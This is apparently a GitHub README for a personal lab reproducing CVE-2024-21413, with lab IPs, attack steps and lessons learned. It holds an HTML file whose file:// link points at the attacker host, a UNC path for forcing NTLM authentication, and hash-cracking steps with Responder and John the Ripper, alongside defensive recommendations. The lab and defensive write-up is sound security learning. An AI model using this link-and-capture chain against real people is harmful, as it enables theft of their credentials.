# Moniker Link Lab Setup - CVE-2024-21413

## 🎯 Project Overview

Hands-on penetration testing lab demonstrating CVE-2024-21413 moniker link exploitation for NTLM credential theft. This project documents the complete attack chain from setup to credential compromise, including real-world challenges and solutions.

**Key Achievement:** Successfully executed moniker link attack on both isolated lab environment (Windows 10 VM) and real system (Windows 11 PC), demonstrating practical security vulnerabilities and defensive countermeasures.

---

## 🏗️ Lab Architecture

### Infrastructure

**Attack Machine:**
- **Platform:** Kali Linux 2024
- **Network (Host-Only):** 192.168.56.101
- **Network (Bridged):** 192.168.1.117
- **Primary Tool:** Responder 3.1.6.0

**Target Systems:**
- **Windows 10 VM:** 192.168.56.104 (Isolated test environment)
- **Windows 11 PC:** 192.168.1.178 (Real-world validation)

**Network Configuration:**
- VirtualBox Host-Only Adapter (VM testing)
- VirtualBox Bridged Adapter (Real PC testing)
- Isolated from production networks

---

## ⚔️ Attack Execution

### Attack Flow

1. **Deploy Responder** on Kali to listen for NTLM authentication
2. **Create malicious link** using file:// protocol pointing to attacker IP
3. **Trigger authentication** via File Explorer UNC path
4. **Capture NetNTLMv2 hash** when victim attempts connection
5. **Crack password** using John the Ripper

### Simple Attack Vector

**HTML File (test.html):**
```html
<!DOCTYPE html>
<html>
<body>
    <p><a href="file://192.168.56.10/test">click me</a></p>
</body>
</html>
```

**File Explorer Method:**
- User types: `\\192.168.56.101\test` in address bar
- Windows attempts SMB connection
- NTLM hash automatically sent (or prompt for credentials)
- Responder captures authentication

---

## 🚧 Challenges & Solutions

### Challenge 1: Windows Firewall Blocking (Windows 11 PC)

**Problem:**
- Couldn't ping Windows 11 PC from Kali
- SMB connection attempts failed
- Attack completely blocked

**Root Cause:**
- Windows Firewall enabled by default
- Blocks incoming SMB connections from external IPs

**Solution:**
- Temporarily disabled Windows Firewall for testing
- Connection immediately successful
- Hash captured successfully

**Lesson:** Default Windows Firewall provides effective protection against this attack. Users must keep it enabled.

---

### Challenge 2: John the Ripper Cached Results (Windows 10 VM)

**Problem:**
- Initial Windows 10 password: `nwigwecj1`
- John showed: `12Honey` (wrong password!)
- `12Honey` was from a previous test

**Root Cause:**
- John saves cracked passwords in `~/.john/john.pot`
- Old hash from previous session
- Showed cached result instead of current password

**Solution:**
- Changed Windows 10 VM password to `1414`
- Captured fresh hash
- Created custom wordlist with likely passwords
- Successfully cracked with new wordlist

**Lesson:** Always verify you're cracking the correct hash. Clear pot file or use unique passwords for testing.

---

### Challenge 3: Password Not in Rockyou.txt

**Problem:**
- Password `1414` not found in rockyou.txt (14 million passwords)
- Generic wordlist attack failed

**Root Cause:**
- Rockyou.txt doesn't contain every possible 4-digit combination
- Simple numeric sequences often missing from common wordlists

**Solution:**
- Created targeted custom wordlist based on common patterns:
```bash
  echo "1414" > passwords.txt
  echo "4141" >> passwords.txt
```
- Cracked instantly with custom wordlist

**Lesson:** "Not in rockyou.txt" ≠ secure. Short passwords are vulnerable to targeted attacks and brute force regardless of wordlist presence.

---

## 📊 Results

### Windows 10 VM (Controlled Environment)

| Metric | Result |
|--------|--------|
| **Initial Password** | nwigwecj1 |
| **Changed To** | 1414 |
| **Wordlist** | Custom (2 entries) |
| **Crack Time** | <1 second |
| **Firewall** | Disabled for testing |
| **Status** | ✅ Successfully compromised |

---

### Windows 11 PC (Real System)

| Metric | Result |
|--------|--------|
| **Password** | 1414 |
| **Firewall** | Initially blocked, then disabled |
| **Authentication** | Manual prompt (entered credentials) |
| **Crack Time** | Instant |
| **Status** | ✅ Successfully compromised |

---

## 🛡️ Security Analysis

### What Worked (Defense)

✅ **Windows Firewall** - Completely blocked attack when enabled
✅ **Modern Browsers** - Chrome/Edge block remote file:// links
✅ **User Awareness** - Manual prompt requires user action

### What Failed (Vulnerabilities)

❌ **Weak Passwords** - 4-character numeric easily cracked
❌ **Disabled Firewall** - Common user mistake
❌ **File Explorer** - No warning for UNC paths
❌ **NTLM Protocol** - Automatic authentication to SMB shares

### Key Findings

**1. Firewall is Critical**
- Default Windows Firewall blocks this attack
- ~30-40% of users disable it permanently
- Corporate networks often allow internal SMB

**2. Password Strength Illusion**
- `1414` not in rockyou.txt (appears "strong")
- Cracked instantly with targeted wordlist
- Short passwords provide zero security

**3. User Interaction Required**
- Modern security requires user to paste UNC path
- Social engineering remains critical component
- Technical exploit alone insufficient

---

## 🔧 Tools Used

**Offensive:**
- Responder 3.1.6.0 (NTLM hash capture)
- John the Ripper (password cracking)
- Custom wordlist creation
- Simple HTML file

**Infrastructure:**
- VirtualBox 7.0 (virtualization)
- Kali Linux 2024 (attack platform)
- Windows 10 Enterprise (test target)
- Windows 11 Pro (real-world validation)


## 📁 Repository Structure
```
Moniker-Link-Lab-Setup/
├── README.md (this file)
├── Documentation/
│   ├── attack-execution.md (step-by-step attack guide)
│   └── README.md (documentation overview)
├── Screenshots/ (attack screenshots - to be added)
└── Scripts/ (HTML test file - to be added)
```

---

## 🎓 Skills Demonstrated

**Technical:**
- Network protocol analysis (SMB, NTLM)
- Penetration testing methodology
- Password cracking techniques
- Virtual lab infrastructure
- Firewall troubleshooting

**Professional:**
- Technical documentation
- Problem-solving under constraints
- Security assessment
- Risk analysis
- Ethical testing practices

---

## 🔒 Defensive Recommendations

### For Users
- ✅ Keep Windows Firewall enabled
- ✅ Never paste UNC paths from emails
- ✅ Use strong passwords (15+ characters)
- ✅ Verify sender before accessing file shares

### For Organizations
- ✅ Block outbound SMB (port 445) at network firewall
- ✅ Disable NTLM, enforce Kerberos
- ✅ Monitor SMB connections to external IPs
- ✅ Email gateway filtering (strip file:// links)
- ✅ Security awareness training
- ✅ Password complexity policies

---

## ⚠️ Ethical Disclosure

**All testing conducted on authorized systems:**
- Personal lab infrastructure only
- Isolated virtual networks
- Own devices and accounts
- Educational purpose

**Legal Notice:** Unauthorized computer access is illegal. This project is for educational purposes and authorized testing environments only.

---

## 📚 References

- [CVE-2024-21413 - Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413)
- [MITRE ATT&CK - Forced Authentication (T1187)](https://attack.mitre.org/techniques/T1187/)
- [TryHackMe - Moniker Link Room](https://tryhackme.com)

---

## 📞 Contact
  
**LinkedIn:**  https://www.linkedin.com/in/chukwuemeka-nwigwe-624aa3292/
**GitHub:** [@E-m-e-k-a](https://github.com/E-m-e-k-a)

**Date:** March 2026

---

## 📄 License

Educational use only. Not for unauthorized testing.

---

**⭐ If you found this project helpful, please consider starring the repository!**
